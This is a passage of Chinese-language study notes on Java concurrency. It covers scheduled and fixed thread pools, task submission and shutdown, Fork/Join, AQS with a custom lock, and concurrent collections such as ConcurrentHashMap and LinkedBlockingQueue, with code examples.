<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(<span class="number">2</span>);</span><br><span class="line">scheduledExecutorService.schedule(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">&#125;,<span class="number">1</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">scheduledExecutorService.schedule(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">&#125;,<span class="number">1</span>, TimeUnit.MILLISECONDS);</span><br></pre></td></tr></table></figure>

<p><strong>定时执行</strong></p>
<blockquote>
<p>scheduleAtFixedRate   每间隔1s执行</p>
<p>以下例子每隔2s执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scheduledExecutorService.scheduleAtFixedRate(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//延时时间，时间间隔，时间单位</span></span><br><span class="line">&#125;,<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>scheeduleWithFixedRate 会在上一次任务执行完了之后再间隔1s执行</p>
<p>以下例子每隔3s执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scheduledExecutorService.scheduleWithFixedDelay(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>



<h5 id="2-4-提交任务"><a href="#2-4-提交任务" class="headerlink" title="2.4 提交任务"></a>2.4 提交任务</h5><h6 id="2-4-1-execute"><a href="#2-4-1-execute" class="headerlink" title="2.4.1 execute"></a>2.4.1 execute</h6><blockquote>
<p>void execute(Runnable command)</p>
</blockquote>
<h6 id="2-4-2-submit"><a href="#2-4-2-submit" class="headerlink" title="2.4.2 submit"></a>2.4.2 submit</h6><blockquote>
<p>Funture&lt;&gt; submit(Callable c)</p>
<p>提交任务task,用<strong>返回值Future获得任务执行结果</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">Future&lt;String&gt; future = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(future.get());</span><br></pre></td></tr></table></figure>

<h6 id="2-4-3-invokeAll"><a href="#2-4-3-invokeAll" class="headerlink" title="2.4.3 invokeAll"></a>2.4.3 invokeAll</h6><blockquote>
<p>提交tasks所有任务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; List&lt;Future&lt;T&gt;&gt; invokeAll(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks)</span><br></pre></td></tr></table></figure>

<p>带超时时间</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; List&lt;Future&lt;T&gt;&gt; invokeAll(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks,</span><br><span class="line">                              <span class="keyword">long</span> timeout, TimeUnit unit)</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">List&lt;Future&lt;String&gt;&gt; futures = executorService.invokeAll(Arrays.asList(</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;3&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">));</span><br><span class="line">futures.forEach(future-&gt;&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(future.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h6 id="2-4-4-invokeAny"><a href="#2-4-4-invokeAny" class="headerlink" title="2.4.4 invokeAny"></a>2.4.4 invokeAny</h6><blockquote>
<p>提交tasks所有任务，哪个任务先成功执行完毕，返回此任务执行结果，其他任务取消</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; <span class="function">T <span class="title">invokeAny</span><span class="params">(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> InterruptedException, ExecutionException</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; <span class="function">T <span class="title">invokeAny</span><span class="params">(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> InterruptedException, ExecutionException, TimeoutException</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">Object invokeAny = executorService.invokeAny(Arrays.asList(</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;3&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">));</span><br><span class="line">System.out.println(invokeAny.toString()); <span class="comment">//2</span></span><br></pre></td></tr></table></figure>

<h5 id="2-5-关闭线程池"><a href="#2-5-关闭线程池" class="headerlink" title="2.5 关闭线程池"></a>2.5 关闭线程池</h5><h6 id="2-5-1-shutdown"><a href="#2-5-1-shutdown" class="headerlink" title="2.5.1 shutdown"></a>2.5.1 shutdown</h6><blockquote>
<p>线程池状态变为    SHUTDOWN</p>
<ul>
<li>不会接收新任务</li>
<li>但已提交的任务会执行完</li>
<li>该方法不会阻塞调用线程的执行,仅会打断空闲线程</li>
</ul>
<p>void shutdown()</p>
</blockquote>
<h6 id="2-5-2-shutdownNow"><a href="#2-5-2-shutdownNow" class="headerlink" title="2.5.2 shutdownNow"></a>2.5.2 shutdownNow</h6><blockquote>
<p>线程池状态变为    STOP</p>
<ul>
<li>不会接收新任务</li>
<li>会将队列中的任务返回</li>
<li>并用 interrupt 的方式中断正在执行的任务</li>
</ul>
<p>List<Runnable> shutdownNow()</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">        Future&lt;String&gt; future = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish111&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Future&lt;String&gt; future1 = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish222&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Future&lt;String&gt; future2 = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish333&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">        executorService.shutdown();</span><br><span class="line"><span class="comment">//        List&lt;Runnable&gt; runnables = executorService.shutdownNow();</span></span><br><span class="line"><span class="comment">//        System.out.println(runnables);</span></span><br></pre></td></tr></table></figure>



<h5 id="2-6-线程池处理线程异常"><a href="#2-6-线程池处理线程异常" class="headerlink" title="2.6 线程池处理线程异常"></a>2.6 线程池处理线程异常</h5><blockquote>
<ul>
<li>try-catch任务自身处理异常</li>
<li>使用Callable得到返回结果，会将异常信息<strong>封装在future对象中</strong></li>
</ul>
</blockquote>
<h4 id="3、Fork-join-线程池"><a href="#3、Fork-join-线程池" class="headerlink" title="3、Fork/join 线程池"></a>3、Fork/join 线程池</h4><blockquote>
<p>jdk1.7 的线程池实现</p>
<ul>
<li><p>体现分治思想，适用于能够进行<strong>任务拆分的cpu密集运算</strong>，默认创建与cpu核心数大小的线程池</p>
</li>
<li><p>任务拆分：将一个大任务拆分为算法上相同的小任务，直至不能拆分可以直接求解</p>
<p><strong>将每个任务的分解和合并交给不同的线程来完成，进一步提升运算效率</strong></p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ForkJoinPool pool=<span class="keyword">new</span> ForkJoinPool(<span class="number">4</span>);</span><br><span class="line">    System.out.println(pool.invoke(<span class="keyword">new</span> MyTask(<span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继承RecursiveTask&lt;返回值类型&gt; 递归task</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTask</span> <span class="keyword">extends</span> <span class="title">RecursiveTask</span>&lt;<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyTask</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Integer <span class="title">compute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        MyTask t1=<span class="keyword">new</span> MyTask(n-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//让一个线程执行此任务</span></span><br><span class="line">        <span class="comment">//拆分</span></span><br><span class="line">        t1.fork();</span><br><span class="line">        <span class="comment">//合并</span></span><br><span class="line">        <span class="keyword">int</span> result=n+t1.join();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="八、J-U-C"><a href="#八、J-U-C" class="headerlink" title="八、J.U.C"></a>八、J.U.C</h3><blockquote>
<p>java.util.concurrent并发包</p>
</blockquote>
<h4 id="1、AQS"><a href="#1、AQS" class="headerlink" title="1、AQS"></a>1、AQS</h4><blockquote>
<p>AbstractQueuedSynchronizer</p>
</blockquote>
<blockquote>
<p><strong>同步器：</strong>用来构建<strong>阻塞式锁和其他同步组件</strong>的基本框架，通过<strong>FIFO等待队列</strong>来完成获取资源线程排队工作</p>
<p>条件变量来实现等待、唤醒机制，支持多个条件变量，类似于Monitor的WaitSet</p>
</blockquote>
<p><strong>特点</strong></p>
<blockquote>
<p><code>AQS</code>使用一个<code>int</code>成员变量来表示同步状态，通过内置的<code>FIFO</code>队列来完成获取资源线程的排队工作。<code>AQS</code>使用<code>CAS</code>对该同步状态进行原子操作实现对其值的修改。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;<span class="comment">//共享变量，使用volatile修饰保证线程可见性</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>getState、setState、compareAndSetState这三个方法对同步状态（独占和共享）进行更改</p>
<p>通过<strong>getState,setState以及compareAndSetState</strong>这三个方法对同步状态进行更改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回同步状态的当前值</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getState</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 设置同步状态的值</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> newState)</span> </span>&#123; </span><br><span class="line">        state = newState;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原子地（CAS操作）将同步状态值设置为给定值update（如果当前同步状态的值等于expect（期望值））</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSetState</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> STATE.compareAndSet(<span class="keyword">this</span>, expect, update);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>同步器提供的模板方法基本上分为3类：<ul>
<li>独占式获取与释放同步状态 ReentrantLock</li>
<li>共享式获取与释放同步状态,多个线程可同时执行 Semaphore CountdownLatch</li>
<li>查询同步队列中的等待线程情况。</li>
</ul>
</li>
</ul>
<h5 id="1-1-方法"><a href="#1-1-方法" class="headerlink" title="1.1 方法"></a>1.1 方法</h5><ul>
<li>tryAcquire(arg)  获取锁</li>
<li>tryRelease(arg) 释放锁</li>
</ul>
<h5 id="1-2-自定义锁"><a href="#1-2-自定义锁" class="headerlink" title="1.2 自定义锁"></a>1.2 自定义锁</h5><img src="http://qiniu.xiaoming.net.cn/AQS独占锁的实现" alt="AQS 独占锁的实现" style="zoom:80%;" />

<p><strong>AQS使用了模板方法模式，自定义同步器时需要重写下面几个AQS提供的模板方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isHeldExclusively()<span class="comment">//该线程是否正在独占资源。只有用到condition才需要去实现它。</span></span><br><span class="line">tryAcquire(<span class="keyword">int</span>)<span class="comment">//独占方式。尝试获取资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryRelease(<span class="keyword">int</span>)<span class="comment">//独占方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryAcquireShared(<span class="keyword">int</span>)<span class="comment">//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。</span></span><br><span class="line">tryReleaseShared(<span class="keyword">int</span>)<span class="comment">//共享方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAqs</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyLock myLock=<span class="keyword">new</span> MyLock();</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            myLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;lock1&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                myLock.unlock();</span><br><span class="line">                System.out.println(<span class="string">&quot;unlock1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;T1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            myLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;lock2&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                myLock.unlock();</span><br><span class="line">                System.out.println(<span class="string">&quot;unlock2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;T2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义不可重入锁</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLock</span> <span class="keyword">implements</span> <span class="title">Lock</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继承同步器类</span></span><br><span class="line">    <span class="comment">//独占锁</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MySync</span> <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>,<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="comment">//成功，加上了锁，并且设置 owner 为当前线程</span></span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">            setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            setState(<span class="number">0</span>); <span class="comment">//state被volatile,写屏障</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span>  <span class="comment">//是否持有独占锁</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> getState()==<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ConditionObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MySync sync=<span class="keyword">new</span> MySync();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用同步器</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//加锁,不成功会进入等待队列等待</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//加锁可打断</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>   <span class="comment">//尝试加锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.tryAcquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//带超时时间的加锁	</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.tryAcquireNanos(<span class="number">1</span>,unit.toNanos(time));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//创建条件变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.newCondition();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、ReentrantLock"><a href="#2、ReentrantLock" class="headerlink" title="2、ReentrantLock"></a>2、ReentrantLock</h4><blockquote>
<p>见 3.7 ReentrantLock 和 十、锁</p>
</blockquote>
<h4 id="3、ReetrantReadWriteLock"><a href="#3、ReetrantReadWriteLock" class="headerlink" title="3、ReetrantReadWriteLock"></a>3、ReetrantReadWriteLock</h4><blockquote>
<p>读写锁，见 10.3 读写锁</p>
</blockquote>
<h5 id="3-1-应用于数据库缓存"><a href="#3-1-应用于数据库缓存" class="headerlink" title="3.1 应用于数据库缓存"></a>3.1 应用于数据库缓存</h5><blockquote>
<ul>
<li>对数据库的读写操作+上读写锁保护</li>
<li>构造HashMap集合，存储缓存。</li>
</ul>
</blockquote>
<p><strong>存在的问题：</strong></p>
<h6 id="1、先更新缓存"><a href="#1、先更新缓存" class="headerlink" title="1、先更新缓存"></a>1、先更新缓存</h6><blockquote>
<p>会出现在缓存拿到的都是旧数据</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201008132757774.png" alt="image-20201008132757774" style="zoom:67%;" />

<h6 id="2、先更新数据库"><a href="#2、先更新数据库" class="headerlink" title="2、先更新数据库"></a>2、先更新数据库</h6><img src="https://csn.damyoung.cn/image-20201008132813721.png" alt="image-20201008132813721" style="zoom:67%;" />

<h5 id="3-2-StampedLock"><a href="#3-2-StampedLock" class="headerlink" title="3.2 StampedLock"></a>3.2 StampedLock</h5><blockquote>
<p>进一步优化读性能，在使用时读锁、写锁都必须配合【戳】使用</p>
</blockquote>
<h4 id="4、线程安全集合类"><a href="#4、线程安全集合类" class="headerlink" title="4、线程安全集合类"></a>4、线程安全集合类</h4><blockquote>
<ul>
<li>遗留- vertor(list)、HashTable</li>
<li>修饰-SynchronizedMap、SynchronizedList(使用Collections方法修饰)-内部还是使用Synchronized</li>
<li>JUC<ul>
<li>Blocking类(实现基于锁，并提供用来阻塞的方法来保证线程安全)</li>
<li>CopyOnWrite类(适用于读多写少)、</li>
<li>Concurrent类-使用<strong>CAS优化</strong>,性能较好，但会存在<strong>弱一致性(可能会读取到旧数据)</strong>(遍历时、size)</li>
</ul>
</li>
</ul>
</blockquote>
<h5 id="4-1-ConcurrentHashMap"><a href="#4-1-ConcurrentHashMap" class="headerlink" title="4.1 ConcurrentHashMap"></a>4.1 ConcurrentHashMap</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcurrentHashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">ConcurrentMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ConcurrentMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>computeIfAbsent()  如果缺少key,则产生新value，并放入Map</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LongAdder value=<span class="keyword">new</span> ConcurrentHashMap&lt;String,LongAdder&gt;().computeIfAbsent( ,(key)-&gt;<span class="keyword">new</span> LongAdder());</span><br><span class="line">value.increment();</span><br></pre></td></tr></table></figure>



<p><strong>原理</strong></p>
<h6 id="4-1-1-HashMap并发死链"><a href="#4-1-1-HashMap并发死链" class="headerlink" title="4.1.1 HashMap并发死链"></a>4.1.1 HashMap并发死链</h6><blockquote>
<p>在jdk7下的，多线程环境下使用非线程安全的map集合，扩容之后产生的<strong>并发死链</strong>问题</p>
<ul>
<li>hashMap根据哈希算法计算数据存储的桶位置，桶位置相同的形成链表<ul>
<li>jdk7-新加入放在第一个</li>
<li>jdk8-新加入放在最后个</li>
</ul>
</li>
<li>多线程形成并发死链问题，在某个桶链表形成环形链表。</li>
</ul>
</blockquote>
<h5 id="4-2-LinkedBlockingQueue"><a href="#4-2-LinkedBlockingQueue" class="headerlink" title="4.2 LinkedBlockingQueue"></a>4.2 LinkedBlockingQueue</h5><blockquote>
<p>Dummy无值，只是个占位节点</p>
</blockquote>
<h6 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h6><img src="https://csn.damyoung.cn/image-20201008221014801.png" alt="image-20201008221014801" style="zoom:67%;" />

<h6 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h6><h6 id="加锁分析"><a href="#加锁分析" class="headerlink" title="加锁分析"></a>加锁分析</h6><blockquote>
<p><strong>使用Dummy占位符和俩把锁</strong></p>
<ul>
<li>用一把锁：同一时刻，最多只允许有一个线程(生产者和消费者二选一)执行</li>
